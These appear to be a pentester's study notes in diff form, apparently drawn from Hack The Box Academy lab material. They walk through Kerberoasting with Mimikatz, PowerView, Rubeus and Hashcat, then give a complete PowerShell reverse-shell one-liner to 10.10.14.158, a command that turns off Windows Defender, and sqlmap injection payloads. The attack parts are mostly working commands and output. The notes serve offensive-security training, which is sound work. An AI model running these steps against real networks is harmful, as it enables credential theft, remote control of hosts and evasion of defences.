+Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-5
+SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
+ValidFrom            : 2/24/2022 11:56:18 PM
+ValidTo              : 2/25/2022 8:55:25 AM
+ServicePrincipalName : WSMAN/ACADEMY-EA-MS01
+SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
+
+The above command combines the previous command with setspn.exe to request tickets for all accounts with SPNs set.
+
+Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.
+
+
+Extracting Tickets from Memory with Mimikatz
+  Kerberoasting - from Windows
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # base64 /out:true
+isBase64InterceptInput  is false
+isBase64InterceptOutput is true
+
+mimikatz # kerberos::list /export  
+
+
+<SNIP>
+
+[00000002] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 2/24/2022 3:36:22 PM ; 2/25/2022 12:55:25 AM ; 3/3/2022 2:55:25 PM
+   Server Name       : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433 @ INLANEFREIGHT.LOCAL
+   Client Name       : htb-student @ INLANEFREIGHT.LOCAL
+   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ; 
+====================
+Base64 of file : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+====================
+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
+ZWZyZWlnaHQubG9jYWw6MTQzMw==
+====================
+
+   * Saved to file     : 2-40a10000-htb-student@MSSQLSvc~DEV-PRE-SQL.inlanefreight.local~1433-INLANEFREIGHT.LOCAL.kirbi
+
+<SNIP>
+
+	Preparing the Base64 Blob for Cracking
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ echo "<base64 blob>" |  tr -d \\n 
+
+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
+We can place the above single line of output into a file and convert it back to a .kirbi file using the base64 utility.
+
+Placing the Output into a File as .kirbi
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ cat encoded_file | base64 -d > sqldev.kirbi
+Next, we can use this version of the kirbi2john.py tool to extract the Kerberos ticket from the TGS file.
+
+Extracting the Kerberos Ticket using kirbi2john.py
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ python2.7 kirbi2john.py sqldev.kirbi
+This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.
+
+Modifiying crack_file for Hashcat
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
+Now we can check and confirm that we have a hash that can be fed to Hashcat.
+
+Viewing the Prepared Hash
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ cat sqldev_tgs_hashcat 
+
+$krb5tgs$23$*sqldev.kirbi*$813149fb261549a6a1b4965ed49d1ba8$7a8c91b47c534bc258d5c97acf433841b2ef2478b425865dc75c39b1dce7f50dedcc29fc8a97aef8d51a22c5720ee614fcb646e28d854bcdc2c8b362bbfaf62dcd9933c55efeba9d77e4c6c6f524afee5c68dacfcb6607291a20cdfb0ef144055356a7296e33b440754be7f87754ac2e4858348e2aebb7270b2d345047f880e17acc07e27a8f752c372bc83a62d54208d12288893d32afd210191dd3b2c56797bd1a72e35a73a7820be51fbf277b83d8181fff5a05cf21481a7b462ceb01c3761c50952689ed1099827c17c2934131db71bc5142c589cd70ed2ebf57dca3f6226f3b21849529355414433210b8d7bd76fec4eb68a45deebc3e7cc931ed8769328536769123f5040d6771915cdbc6c90164669fac72d23a631fef25804b5c8ec39680a4cc2959929edce34bbee6aff135bcbbb26a41a4b4e88b936896d4662ac849f56d7d68071be139cf4dfaf66497015297f9b44cdaef096c8d00255ec3e62f7105d905d0b2f39cef83db4d812718f95e8c99129f3207b386b4c32f7d57befd411e19c218148d19028eb0103d6be99ae23a454f6f3b0339d00d27879f342598937596cadad068ac3d815952a053f87d87b2584784b9d83050eea9a7c6474cde26c90f4a3546076a40ed374d004c465f654623499ca14e9c11538012cf00dee315e2ed444293822502d7f685022e61f3568e1db25b5cfe5a89b33878b6e3db05e9d91ad63820fcb7d0449e66add13f1efceddda95339db3dc919f1caff9690e54b3e4f9a8cf6998a9f9bf55c7a2ed2c87382e9da60f7ca3c22e08cc359f3ef6f4603a5af2fc28303bf3602ab9bc52026e58c27fb247fd4210f45244fd71484685b837fe9573a53964d54acfde7f963028764e99bea7b77139cb651328e862e43d894638288eace99b6d4f8b6684150db9adc43254143b77f32ebe6fbe309dde3b78305fdf0fe60505f9000b89c67c75ef6dd425e04fbe3a5ebf2d78a11a392d815a29ef48d9457fb6c780eb4cc07dfa68c2e97054788952f5ad92ca8d062e4a68967860302fd9630174af832e599bb5fca9cf341d7a1176868d9073796dffbd48efe99b222f4274e93066de646b3c60d1dd94072dd121dd0706024d11738a75ebeb5b7865a5505220d0f03aea6d359a17f3c5b6424989b31b6e52d1c558393aa34e81204fb107374a8884dcb16f6c59a76a0022004fd921734b8719e8694ba0d7f87eb46f5607af4eb1c681b6b5140dbc94a9ea7f5db6ae4c71fbc1024a25b77ac00bdc549d66373d390643be8f1007930a4124e99d4fcb6177dbd5669fb06170d3b8a75db9928164b55e454d08e77f917b1dd2e648d9c7eb0cb2b8ca0eff8a44d1ea5fdd67e01da79047a4a1406f761f5e3b6944cebed45379ea14e7a027c843fa405c07c8385a2102f07967a7cb4883f44ee72d4aa7a38b2701e77374016a01193f5b178e34f4cf2d8eadf651e162569eb421c74e8d5e0cc1a9fab58a4b9b63babb09efc3427e1667f9c7731bcabe3645986040a7306924df5e6e68655e7b0e2e88e7ce0281e0f554de82d9de6c4d9c8d2a36fce65bbb337a415030ce1d03c00fd9783afb5df0ee8fbabfa358521ad845e6d07fde7d34f2311ebae6e6a119d60d899467a66f997c273d2df73350f2d6c5438e71a057feeab
+We can then run the ticket through Hashcat again and get the cleartext password database!.
+
+Cracking the Hash with Hashcat
+  Kerberoasting - from Windows
+Viyky7@htb[/htb]$ hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt 
+
+Automated / Tool Based Route
+
+Using PowerView to Extract TGS Tickets
+  Kerberoasting - from Windows
+PS C:\htb> Import-Module .\PowerView.ps1
+PS C:\htb> Get-DomainUser * -spn | select samaccountname
+
+samaccountname
+--------------
+adfs
+backupagent
+krbtgt
+sqldev
+sqlprod
+sqlqa
+solarwindsmonitor
+From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.
+
+Using PowerView to Target a Specific User
+  Kerberoasting - from Windows
+PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+
+SamAccountName       : sqldev
+DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
+TicketByteHexStream  :
+Hash                 : $krb5tgs$23$*sqldev$INLANEFREIGHT
+
+Finally, we can export all tickets to a CSV file for offline processing.
+
+Exporting All Tickets to a CSV File
+  Kerberoasting - from Windows
+PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
+Viewing the Contents of the .CSV File
+  Kerberoasting - from Windows
+PS C:\htb> cat .\ilfreight_tgs.csv
+
+"SamAccountName","DistinguishedName","ServicePrincipalName","TicketByteHexStream","Hash"
+"adfs","CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL","adfsconnect/azure01.inlanefreight.local",,"$krb5tgs$23$*adfs$INLANEFREIGHT.LOCAL$adfsconnect/azure01.inlanefreight.local*$59C086008BBE7EAE4E483506632F6EF8$622D9E1DBCB1FF2183482478B5559905E0CCBDEA2B52A5D9F510048481F2A3A4D2CC47345283A9E71D65E1573DCF6F2380A6FFF470722B5DEE704C51FF3A3C2CDB2945CA56F7763E117F04F26CA71EEACED25730FDCB06297ED4076C9CE1A1DBFE961DCE13C2D6455339D0D90983895D882CFA21656E41C3DDDC4951D1031EC8173BEEF9532337135A4CF70AE08F0FB34B6C1E3104F35D9B84E7DF7AC72F514BE2B346954C7F8C0748E46A28CCE765AF31628D3522A1E90FA187A124CA9D5F911318752082FF525B0BE1401FBA745E1
+
+<SNIP>
+
+We can also use Rubeus from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.
+
+We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.
+
+Let's use Rubeus to request tickets for accounts with the admincount attribute set to 1. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the /nowrap flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.
+
+Using the /nowrap Flag
+  Kerberoasting - from Windows
+PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))(admincount=1))'
+
+[*] Total kerberoastable users : 3
+
+
+[*] SamAccountName         : backupagent
+[*] DistinguishedName      : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : backupjob/veam001.inlanefreight.local
+[*] PwdLastSet             : 2/15/2022 2:15:40 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*backupagent$INLANEFREIGHT.LOCAL$backupjob/veam
+
+
+A Note on Encryption Types
+ The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.
+Kerberoasting tools typically request RC4 encryption when performing the attack and initiating TGS-REQ requests. This is because RC4 is weaker and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with $krb5tgs$23$*, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with $krb5tgs$18$*. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using Hashcat, it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.
+
+Let's start by creating an SPN account named testspn and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.
+
+  Kerberoasting - from Windows
+PS C:\htb> .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : testspn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+
+[*] SamAccountName         : testspn
+[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
+[*] PwdLastSet             : 2/27/2022 12:15:43 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash                   : $krb5tgs$23$*testspn$INLANEFREIGHT.LOCAL$testspn/kerberoast.inlanefreight.
+
+hecking with PowerView, we can see that the msDS-SupportedEncryptionTypes attribute is set to 0. The chart here tells us that a decimal value of 0 means that a specific encryption type is not defined and set to the default of RC4_HMAC_MD5.
+
+  Kerberoasting - from Windows
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            0 testspn
+
+Let's assume that our client has set SPN accounts to support AES 128/256 encryption.
+
+If we check this with PowerView, we'll see that the msDS-SupportedEncryptionTypes attribute is set to 24, meaning that AES 128/256 encryption types are the only ones supported.
+
+Checking Supported Encryption Types
+  Kerberoasting - from Windows
+PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
+
+serviceprincipalname                   msds-supportedencryptiontypes samaccountname
+--------------------                   ----------------------------- --------------
+testspn/kerberoast.inlanefreight.local                            24 testspn
+
+Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.
+
+Requesting a New Ticket
+  Kerberoasting - from Windows
+PS C:\htb>  .\Rubeus.exe kerberoast /user:testspn /nowrap
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Target User            : testspn
+[*] Target Domain          : INLANEFREIGHT.LOCAL
+[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=testspn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'
+
+[*] Total kerberoastable users : 1
+
+[*] SamAccountName         : testspn
+[*] DistinguishedName      : CN=testspn,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+[*] ServicePrincipalName   : testspn/kerberoast.inlanefreight.local
+[*] PwdLastSet             : 2/27/2022 12:15:43 PM
+[*] Supported ETypes       : AES128_CTS_HMAC_SHA1_96, AES256_CTS_HMAC_SHA1_96
+[*] Hash                   : $krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*t
+
+To run this through Hashcat, we need to use hash mode 19700, which is Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)
+
+hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt 
+
+We can use Rubeus with the /tgtdeleg flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.
+
+Using the /tgtdeleg Flag
+
+.\RRubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap
+
+============================
+shels and payloads
+
+reverse shell with windows 
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+
+At line:1 char:1
++ $client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443) ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent
+
+The Windows Defender antivirus (AV) software stopped the execution of the code. This is working exactly as intended, and from a defensive perspective, this is a win. From an offensive standpoint, there are some obstacles to overcome if AV is enabled on a system we are trying to connect with. For our purposes, we will want to disable the antivirus through the Virus & threat protection settings or by using this command in an administrative PowerShell console (right-click, run as admin):
+
+Disable AV
+  Reverse Shells
+PS C:\Users\htb-student> Set-MpPreference -DisableRealtimeMonitoring $true
+
+Prominent Windows Exploits
+Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:
+
+Vulnerability	Description
+MS08-067	MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.
+Eternal Blue	MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.
+PrintNightmare	A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can install a printer, add a driver that runs for you, and grants you system-level access to the host. This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome post on it here.
+BlueKeep	CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.
+Sigred	CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server which is commonly the primary Domain Controller.
+SeriousSam	CVE 2021-36924 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
+Zerologon	CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses at a computer account password before finding what they need. This can happen in a matter of a few seconds.
+
+[*] MS17-010 (EternalBlue) has been known to affect hosts ranging from Windows 2008 to Server 2016.  It is running Windows Server 2016 Standard 6.3
+
+Tilde Enumeration using IIS ShortName Scanner
+Manually sending HTTP requests for each letter of the alphabet can be a tedious process. Fortunately, there is a tool called IIS-ShortName-Scanner that can automate this task. 
+java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/
+=========================
+sqlmap 
+
+Prefix/Suffix
+There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.
+For such runs, options --prefix and --suffix can be used as follows:
+
+Code: bash
+sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
+This will result in an enclosure of all vector values between the static prefix %')) and the suffix -- -.
+For example, if the vulnerable code at the target is:
+
+Code: php
+$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
+$result = mysqli_query($link, $query);
+The vector UNION ALL SELECT 1,2,VERSION(), bounded with the prefix %')) and the suffix -- -, will result in the following (valid) SQL statement at the target:
+
+Code: sql
+SELECT id,name,surname FROM users WHERE id LIKE (('test%')) UNION ALL SELECT 1,2,VERSION()-- -')) LIMIT 0,1
+
+
+Level/Risk
+By default, SQLMap combines a predefined set of most common boundaries (i.e., prefix/suffix pairs), along with the vectors having a high chance of success in case of a vulnerable target. Nevertheless, there is a possibility for users to use bigger sets of boundaries and vectors, already incorporated into the SQLMap.
+
+For such demands, the options --level and --risk should be used:
+
+The option --level (1-5, default 1) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
+
+The option --risk (1-3, default 1) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
+
+The best way to check for differences between used boundaries and payloads for different values of --level and --risk, is the usage of -v option to set the verbosity level. In verbosity 3 or higher (e.g. -v 3), messages containing the used [PAYLOAD] will be displayed, as follows:
+
+  Attack Tuning
+Viyky7@htb[/htb]$ sqlmap -u www.example.com/?id=1 -v 3 --level=5
+
+...SNIP...
+[14:17:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[14:17:07] [PAYLOAD] 1) AND 5907=7031-- AuiO
+[14:17:07] [PAYLOAD] 1) AND 7891=5700 AND (3236=3236
+...SNIP...
+[14:17:07] [PAYLOAD] 1')) AND 1049=6686 AND (('OoWT' LIKE 'OoWT
+[14:17:07] [PAYLOAD] 1'))) AND 4534=9645 AND ((('DdNs' LIKE 'DdNs
+[14:17:07] [PAYLOAD] 1%' AND 7681=3258 AND 'hPZg%'='hPZg
+...SNIP...
